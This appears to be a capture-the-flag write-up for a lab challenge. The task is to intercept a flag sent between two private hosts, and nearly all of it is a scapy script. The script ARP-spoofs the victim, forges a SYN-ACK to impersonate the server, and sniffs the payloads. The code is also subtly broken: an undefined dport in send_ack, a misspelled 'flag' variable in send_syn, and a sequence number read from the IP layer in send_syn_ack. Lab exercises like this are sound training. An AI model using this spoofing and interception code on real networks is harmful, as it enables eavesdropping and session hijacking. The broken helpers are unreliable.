# Problem Statement
Intercept traffic from a remote host. The remote host at 10.0.0.2 is communicating with the remote host at 10.0.0.3 on port 31337.

## Observations
- This is trivial using python's socket module (we would need to add PREROUTING rules to the DNAT table if we don't use raw sockets), but pretty interesting if we use scapy to craft our own packet.

## Solution
```
from scapy.all import *

def arp_spoof(victim_ip, impersonated_ip):
    hwsrc = get_if_hwaddr("eth0")
    hwdst = getmacbyip(victim_ip)
    send(ARP(op=2, hwsrc=hwsrc, hwdst=hwdst, psrc=impersonated_ip, pdst=victim_ip))

def send_ack(pkt):
    seq = pkt[TCP].ack
    ack = pkt[TCP].seq + 1 # ACK the other end's SYN
    flags = "A" # ACK
    src = pkt[IP].dst
    dst = pkt[IP].src
    sport = pkt[TCP].dport
    sport = pkt[TCP].dport
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flags))

def send_syn(pkt):
    seq = 12345 # whatever
    ack = 0
    flags = "S" # SYN
    src = pkt[IP].dst
    dst = pkt[IP].src
    sport = pkt[TCP].dport
    dport = pkt[TCP].sport
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flag))


def send_syn_ack(pkt):
    seq = 12345 # whatever
    ack = pkt[IP].seq + 1 # ACK other end's SYN
    flags = "SA" # SYN/ACK
    src = pkt[IP].dst
    dst = pkt[IP].src
    sport = pkt[TCP].dport
    dport = pkt[TCP].sport
    send(IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=seq, ack=ack, flags=flags))




# Client connects to 10.0.0.3:31337, sends flag
# We want to impersonate 10.0.0.3 and accept 10.0.0.2's connection

arp_spoof("10.0.0.2", "10.0.0.3")

pkt = sniff(iface="eth0", prn=lambda x: x.show(), filter="tcp[13] & 0x12 = 0x02", count=1)[0] # Flags are set on the 14th byte of TCP packets. 0x10 is ACK, 0x02 is SYN
send_syn_ack(pkt)
sniff(iface="eth0", filter="tcp", prn=lambda pkt: print(pkt[Raw].load) if Raw in pkt else None) # Sniff once th econnection has been established and print payloads if any (flag will be there)
```
